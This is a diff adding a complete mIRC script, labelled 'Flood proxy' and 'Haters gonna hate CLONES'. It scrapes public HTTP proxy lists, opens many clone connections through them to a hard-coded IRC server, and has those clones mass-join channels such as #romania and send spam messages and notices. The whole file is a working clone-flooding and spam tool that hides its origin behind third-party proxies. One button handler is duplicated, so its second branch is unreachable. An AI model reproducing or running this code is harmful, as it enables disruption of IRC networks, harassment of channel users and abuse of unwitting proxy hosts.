@@ -1,0 +1,361 @@
+dialog HGH {
+  title "[Cone conectate: 0 | Sockets: 0]"
+  size -1 -1 434 199
+  option dbu
+  tab "HTTP List", 1, 1 0 431 197
+  list 4, 4 23 165 146, tab 1 size
+  text "HTTP Proxy list:", 5, 4 14 111 8, tab 1
+  button "Adauga manual", 6, 5 170 45 12, tab 1
+  button "Sterge selectia", 7, 123 170 45 12, tab 1
+  button "Incarca proxy", 8, 5 184 45 12, tab 1
+  button "Curata lista", 9, 123 184 45 12, tab 1
+  text "In computer networks, a proxy server is a server (a computer system or an application) that acts as an intermediary for requests from clients seeking resources from other servers. A client connects to the proxy server, requesting some service, such as a file, connection, web page, or other resource, available from a different server.", 10, 178 23 244 31, tab 1
+  button "Scaneaza proxy", 54, 51 170 69 26, tab 1 flat multi
+  tab "Connection", 2
+  text "IRC destination IP:", 11, 8 27 55 8, tab 2 center
+  text "IRC destination PORT:", 12, 8 38 55 8, tab 2
+  box "IRC Connection details:", 13, 4 16 115 35, tab 2
+  edit "51.254.219.229", 14, 65 26 50 10, tab 2 multi autohs
+  box "IRC Nickname reply settings:", 16, 4 53 115 42, tab 2
+  edit "C:\nicklist.txt", 18, 52 62 64 10, tab 2 multi autohs
+  radio "Load from file:", 17, 6 62 45 10, tab 2 flat
+  radio "Use prefix:", 19, 6 73 38 10, tab 2 flat
+  edit "[stress]", 20, 52 73 64 10, tab 2 multi autohs
+  radio "Randomize nickname", 21, 6 84 61 10, tab 2 flat
+  edit "6667", 15, 65 36 50 10, tab 2 multi autohs
+  box "Connection producer:", 22, 4 98 115 96, tab 2
+  check "Delay timer:", 23, 8 122 40 10, tab 2
+  edit "2", 24, 48 122 12 10, tab 2 multi autohs
+  button "Create connections", 25, 9 135 105 12, tab 2
+  button "Close connections", 26, 9 161 105 12, tab 2
+  button "Stop connections producer", 27, 9 148 105 12, tab 2
+  text "In computer networks, a proxy server is a server (a computer system or an application) that acts as an intermediary for requests from clients seeking resources from other servers. A client connects to the proxy server, requesting some service, such as a file, connection, web page, or other resource, available from a different server.", 28, 120 19 306 25, tab 2
+  tab "Control panel", 3
+  list 29, 4 15 156 172, tab 3 sort size extsel vsbar
+  text "Change nickname prefix:", 30, 164 19 61 8, tab 3
+  edit "Proxy-", 31, 226 18 124 10, tab 3 multi autohs
+  text "RAW command:", 32, 164 30 61 8, tab 3 center
+  edit "PRIVMSG #romania,#trivia,#scrabble,#ajutor :!help !commands [oferit de BLKoldSUN]", 33, 226 29 124 10, tab 3 multi autohs
+  text "Join channel:", 34, 164 41 61 8, tab 3 center
+  edit "#romania,#trivia,#scrabble,#radioclick,#ajutor", 35, 226 40 124 10, tab 3 multi autohs
+  text "Message to:", 36, 164 63 31 8, tab 3 center
+  edit "Caesar", 37, 196 62 29 10, tab 3 multi autohs
+  text "Part channel:", 38, 164 52 61 8, tab 3 center
+  edit "#romania,#trivia,#scrabble,#scrabble,#ajutor", 39, 226 51 124 10, tab 3 multi autohs
+  edit "!help !commands", 40, 226 62 124 10, tab 3 multi autohs
+  button "Reconnect", 41, 175 98 66 12, disable tab 3
+  button "Do it!", 44, 354 40 38 10, tab 3
+  button "Do it!", 46, 354 62 38 10, tab 3
+  button "Do it!", 45, 354 51 38 10, tab 3
+  button "Do it!", 43, 354 29 38 10, tab 3
+  button "Do it!", 42, 354 18 38 10, tab 3
+  button "Disconnect", 47, 175 111 66 12, disable tab 3
+  button "PING? PONG!", 48, 175 124 66 12, tab 3
+  check "Select all on command", 55, 4 186 78 10, tab 3
+  edit "", 57, 196 73 29 10, tab 3 multi autohs
+  text "Notice to:", 56, 164 74 31 8, tab 3 center
+  edit "!help !commands", 58, 226 73 124 10, tab 3 multi autohs
+  button "Do it!", 59, 354 73 38 10, tab 3
+  box "Conexiune clone", 60, 175 142 245 50, tab 3
+  button "Creaza conexiuni", 61, 187 163 61 12, tab 3
+  button "Opreste", 62, 252 163 73 12, tab 3
+  button "Deconecteaza", 63, 329 163 74 12, tab 3
+  tab "Remote", 49
+  edit "", 50, 3 16 424 164, tab 49 read multi return autohs autovs vsbar
+  button "Clear remote", 51, 4 182 37 12, tab 49
+  button "Save remote", 52, 43 182 37 12, tab 49
+  check "Receive remote logs", 53, 82 183 59 10, tab 49
+}
+
+menu * {
+  tools
+  .Flood proxy: dialog -m hgh hgh
+}
+on *:dialog:HGH:init:0: did -c $dname 19,23,53,55
+on *:dialog:HGH:sclick:*: {
+  if ($did == 7) && ($did($dname,4).sel) { did -d $dname 4 $v1 }
+  elseif ($did == 6) { if ($regex($$?="IP:PORT of the HTTP proxy:",/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5})/)) did -a $dname 4 $regml(1) }
+  elseif ($did == 9) { did -r $dname 4 }
+  elseif ($did == 54) { proxygettor }
+  elseif ($did == 29) && ($did($dname,29).sel) { did -u $dname 55 }
+  elseif ($did == 55) { did -u $dname 29 }
+  elseif ($did == 42) {
+    var %x = 1
+    if ($did($dname,55).state) {
+      while ($did($dname,29,%x)) { 
+        var %cur = $remove($gettok($v1,2,32),$chr(40),$chr(41)),%rnick = $did($dname,31) $+ $randomstring($r(4,6))
+        if ($sock(HGH. $+ %cur)) sockwrite -tn HGH. $+ %cur NICK %rnick
+        inc %x
+      }
+      return 1
+    }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41)),%rnick = $did($dname,31) $+ $randomstring($r(4,6))
+      if ($sock(HGH. $+ %cur)) sockwrite -tn HGH. $+ %cur NICK %rnick
+      inc %x
+    }
+  }
+  elseif ($did == 51) { did -r $dname 50 }
+  elseif ($did == 44) {
+    var %x = 1
+    if ($did($dname,55).state) { sockwrite -tn HGH.* join #$did($dname,35) | return 1 }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41))
+      if ($sock(HGH. $+ %cur)) sockwrite -tn HGH. $+ %cur join #$did($dname,35)
+      inc %x
+    }
+  }
+  elseif ($did == 43) {
+    var %x = 1
+    if ($did($dname,55).state) { sockwrite -tn HGH.* $did($dname,33) | return 1 }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41))
+      if ($sock(HGH. $+ %cur)) sockwrite -tn HGH. $+ %cur $did($dname,33)
+      inc %x
+    }
+  }
+  elseif ($did == 45) {
+    var %x = 1
+    if ($did($dname,55).state) { sockwrite -tn HGH.* part #$did($dname,35) | return 1 }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41))
+      if ($sock(HGH. $+ %cur)) sockwrite -tn HGH. $+ %cur part #$did($dname,39)
+      inc %x
+    }
+  }
+  elseif ($did == 41) {
+    var %x = 1
+    if ($did($dname,55).state) { 
+      while $sock(HGH.*,%x) {
+        var %v1 = $v1
+        sockclose %v1
+        sockopen %v1 $remove($replace(%v1,:,$chr(32)),HGH.)
+        inc %x
+      }   
+      return 1
+    }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41))
+      if ($sock(HGH. $+ %cur)) sockclose HGH. $+ %cur | sockopen HGH. $+ %cur $replace(%cur,:,$chr(32))
+      inc %x
+    }
+  }
+  elseif ($did == 52) {
+    var %filename = $qt($sfile($mircdir,Save remote log file:,Save)),%x = 1
+    write -c %filename ;Generated by HGH Clones remote $date $time
+    if (!%filename) return 0
+    while ($did($dname,50,%x).text) {
+      write %filename $v1
+      inc %x
+    }
+  }
+  elseif ($did == 47) {
+    var %x = 1
+    if ($did($dname,55).state) { sockclose HGH.* | return 1 }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41))
+      if ($sock(HGH. $+ %cur)) sockclose HGH. $+ %cur
+      inc %x
+    }
+  }
+  elseif ($did == 48) {
+    var %x = 1
+    if ($did($dname,55).state) { sockwrite -tn HGH.* PING : $+ $randomnumbers(6) | return 1 }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41))
+      if ($sock(HGH. $+ %cur)) sockwrite -tn HGH. $+ %cur PING : $+ $randomnumbers(6)
+      inc %x
+    }
+  }
+  elseif ($did == 46) {
+    var %x = 1
+    if ($did($dname,55).state) { sockwrite -tn HGH.* PRIVMSG #$did($dname,37) : $+ $did($dname,40) | return 1 }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41))
+      if ($sock(HGH. $+ %cur)) sockwrite -tn HGH. $+ %cur PRIVMSG #$did($dname,37) : $+ $did($dname,40)
+      inc %x
+    }
+  }
+  elseif ($did == 59) {
+    var %x = 1
+    if ($did($dname,55).state) { sockwrite -tn HGH.* NOTICE #$did($dname,57) : $+ $did($dname,58) | return 1 }
+    while ($did(HGH,29,%x).sel) {
+      var %cur = $remove($gettok($did(HGH,29,$v1).text,2,32),$chr(40),$chr(41))
+      if ($sock(HGH. $+ %cur)) sockwrite -tn HGH. $+ %cur NOTICE #$did($dname,57) : $+ $did($dname,58)
+      inc %x
+    }
+  }
+  elseif ($did == 8) {
+    var %dir = $sfile($mircdir,Load HTTP proxy from file:,Load)
+    if (!%dir) { return 0 }
+    var %x = 1
+    while (%x <= $lines(%dir)) {
+      if ($regex($read(%dir,%x),/([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\:[0-9]{1,5})/)) { did -a $dname 4 $regml(1) }
+      inc %x
+    }
+  }
+  elseif ($did == 27) {
+    .timerHGH. off
+  }
+  elseif ($did == 26) {
+    .timerHGH. off
+    .sockclose HGH.*
+    did -r $dname 29
+    dialog -t HGH Haters gonna hate CLONES [Clone conectate: 0 $(|) Sockets: 0]
+  }
+
+  ;; am adaugat eu inca 3 butoane ca sa nu mai schimb taburile
+  elseif ($did == 61) {
+    .timerHGH. off
+  }
+  elseif ($did == 63) {
+    .timerHGH. off
+    .sockclose HGH.*
+    did -r $dname 29
+    dialog -t HGH Haters gonna hate CLONES [Clone conectate: 0 $(|) Sockets: 0]
+  }
+
+  elseif ($did == 61) {
+    if (!$did($dname,14)) { return $input(Invaild IRC destination IP.,ho,Error) }
+    if (!$did($dname,15)) { return $input(Invaild IRC destination PORT.,ho,Error) }
+    if ($did($dname,17).state) && (!$isfile($did($dname,18))) { return $input(IRC Nickname prefix file cannot be found.,ho,Error) }
+    if ($did($dname,19).state) && ((!$did($dname,20)) || ($mid($did($dname,20),1,1) isnum)) { return $input(IRC Nickname prefix is not vaild to be empty or number on the first char.,ho,Error) }
+    if ($did($dname,23).state) && ($did($dname,24) !isnum) { return $input(Connection delay must be a number.,ho,Error) }
+    var %x = 1,%timer = 0
+    while ($did($dname,4,%x).text) {
+      var %v1 = $v1
+      if (!$sock(HGH. $+ %v1)) .timerHGH. $+ %v1 1 %timer sockopen HGH. $+ %v1 $gettok(%v1,1,58) $gettok(%v1,2,58)
+      if ($did($dname,23).state) inc %timer $did($dname,24)
+      inc %x
+    }
+  }
+  elseif ($did == 25) {
+    if (!$did($dname,14)) { return $input(Invaild IRC destination IP.,ho,Error) }
+    if (!$did($dname,15)) { return $input(Invaild IRC destination PORT.,ho,Error) }
+    if ($did($dname,17).state) && (!$isfile($did($dname,18))) { return $input(IRC Nickname prefix file cannot be found.,ho,Error) }
+    if ($did($dname,19).state) && ((!$did($dname,20)) || ($mid($did($dname,20),1,1) isnum)) { return $input(IRC Nickname prefix is not vaild to be empty or number on the first char.,ho,Error) }
+    if ($did($dname,23).state) && ($did($dname,24) !isnum) { return $input(Connection delay must be a number.,ho,Error) }
+    var %x = 1,%timer = 0
+    while ($did($dname,4,%x).text) {
+      var %v1 = $v1
+      if (!$sock(HGH. $+ %v1)) .timerHGH. $+ %v1 1 %timer sockopen HGH. $+ %v1 $gettok(%v1,1,58) $gettok(%v1,2,58)
+      if ($did($dname,23).state) inc %timer $did($dname,24)
+
+      inc %x
+    }
+  }
+}
+alias -l randomstring {
+  var %x = 1,%buffer
+  while (%x <= $1) {
+    var %buffer = %buffer $+ $iif($r(0,1),$r(a,z),$r(A,Z))
+    inc %x
+  }
+  return %buffer 
+}
+alias -l randomnumbers {
+  var %x = 1,%buffer
+  while (%x <= $1) {
+    var %buffer = %buffer $+ $r(0,9)
+    inc %x
+  }
+  return %buffer 
+}
+alias  HGH.remote { if ($dialog(hgh)) && ($did(hgh,53).state) { did -a HGH 50 $timestamp < $+ $1 $+ > $2- $crlf } }
+on *:dialog:HGH:close:0: { .sockclose HGH.* | .timerHGH.* off | .sockclose proxy.rosin* }
+on *:sockclose:HGH.*: { 
+  HGH.Remote $remove($sockname,HGH.) -> Connection closed
+  var %x = 1
+  while ($did(HGH,29,%x)) {
+    var %cur = * ( $+ %sockname $+ ),%v1 = $v1
+    if (%cur iswm %v1) { did -d HGH 29 %x }
+    inc %x
+  }
+}
+alias proxygettor {
+  if ($sock(proxy.rosin)) { sockclose proxy.rosin }
+  if ($sock(proxy.rosin2)) { sockclose proxy.rosin2 }
+  sockopen proxy.rosin tools.rosinstrument.com 80
+  sockmark proxy.rosin /proxy/l100.xml
+  set %proxy.rosin.accepted $false
+  set %proxy.rosin2.accepted $false
+  sockopen proxy.rosin2 tools.rosinstrument.com 80
+  sockmark proxy.rosin2 /proxy/plab100.xml
+}
+on *:sockopen:*: {
+  var %sockwrite = sockwrite -tn $sockname
+  if ($sockerr) return 0
+  if (proxy.rosin* iswm $sockname) {
+    %sockwrite GET $sock($sockname).mark HTTP/1.1
+    %sockwrite Host: tools.rosinstrument.com
+    %sockwrite User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; he; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18
+    %sockwrite Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    %sockwrite Accept-Language: he,en-us;q=0.7,en;q=0.3
+    %sockwrite Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7
+    %sockwrite Connection: close
+    %sockwrite
+  }
+  elseif (HGH* iswm $sockname) {
+    var %sockname = $remove($sockname,HGH.)
+    %sockwrite CONNECT $+($did(HGH,14),:,$did(HGH,15)) HTTP/1.0 $+ $crlf $+ $crlf
+    %sockwrite USER $randomstring(5) " $+ $randomstring(4) $+ .com" " $+ $did(HGH,14) $+ " : $+ $randomstring(5) $+ $crlf
+    if ($did(HGH,17).state) { 
+      var %xnick = $read($did(HGH,18))
+    }
+    elseif ($did(HGH,19).state) { 
+      var %xnick = $did(HGH,20) $+ $randomstring($r(4,7))
+    }
+    elseif ($did(HGH,21).state) { 
+      var %xnick = $randomstring($r(4,10))
+    }
+    %sockwrite NICK %xnick $+ $crlf $+ $crlf
+    sockmark $sockname %xnick
+    HGH.remote %sockname -> Connecting to $+($did(HGH,14),:,$did(HGH,15))
+  }
+}
+on *:sockread:*: {
+  var %buffer
+  if ($sockerr) { if (HGH.* iswm $sockname) HGH.remote $remove($sockname,HGH.) -> Connection closed due socket error: $v1 $+ . | sockclose $sockname }
+  if (!$sock($sockname)) { halt }
+  sockread -f %buffer
+  while $sockbr {
+    if ($sockname == proxy.rosin) {
+      if (%buffer == <item>) && (!%proxy.rosin.accepted) { set %proxy.rosin.accepted 1 }
+      elseif ($regex(%buffer,/<title>(.+)<\/title>/i)) && (%proxy.rosin.accepted) { did -a HGH 4 $regml(1) }
+    }
+    elseif ($sockname == proxy.rosin2) {
+      if (%buffer == <item>) && (!%proxy.rosin2.accepted) { set %proxy.rosin2.accepted 1 }
+      elseif ($regex(%buffer,/<title>(.+)<\/title>/i)) && (%proxy.rosin2.accepted) { did -a HGH 4 $regml(1) }
+    }
+    elseif (HGH.* iswm $sockname) {
+      var %sockname = $remove($sockname,HGH.)
+      tokenize 32 %buffer
+      HGH.remote %sockname $1-
+      dialog -t HGH Haters gonna hate CLONES [Clone conectate: $did(HGH,29).lines $(|) Sockets: $sock(HGH.*,0) $+ ]
+      if ($1 == ping) { sockwrite -tn $sockname PONG $2 }
+      elseif ($2 == 376) || ($2 == 422) { HGH.remote %sockname -> %sockname is now connected to the target. | did -a HGH 29 $sock($sockname).mark ( $+ %sockname $+ ) }
+      elseif ($2 == 433) { 
+        if ($did(HGH,17).state) { 
+          var %xnick = $read($did(HGH,18)) $+ $randomnumbers($r(1,3))
+        }
+        elseif ($did(HGH,19).state) { 
+          var %xnick = $did(HGH,20) $+ $randomstring($r(4,7))
+        }
+        elseif ($did(HGH,21).state) { 
+          var %xnick = $randomstring($r(4,10))
+        }
+        sockwrite -tn $sockname NICK %xnick $+ $crlf $+ $crlf
+        sockmark $sockname %xnick
+      }
+      elseif ($2 == nick) && (!$4) { 
+        var %nick = $remove($gettok($1,1,$asc(!)),:),%newnick = $remove($3,:),%x = 1
+        while ($did(HGH,29,%x)) {
+          var %cur = %nick ( $+ %sockname $+ ),%v1 = $v1
+          if (%v1 == %cur) { did -ok HGH 29 %x %newnick ( $+ %sockname $+ ) }
+          inc %x
+        }
+      }
+    }
+    sockread -f %buffer
+  }
+}
